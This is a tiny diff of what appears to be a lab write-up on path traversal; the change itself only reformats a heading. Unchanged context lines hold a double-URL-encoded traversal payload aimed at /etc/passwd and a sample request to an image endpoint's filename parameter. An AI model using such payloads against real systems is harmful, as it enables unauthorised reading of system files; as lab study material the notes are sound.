@@ -14,7 +14,9 @@
 
 %252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd // ctrl + u
 
-### step1
+---
+
+### step 1
 
 GET /image?filename=16.jpg HTTP/1.1
 
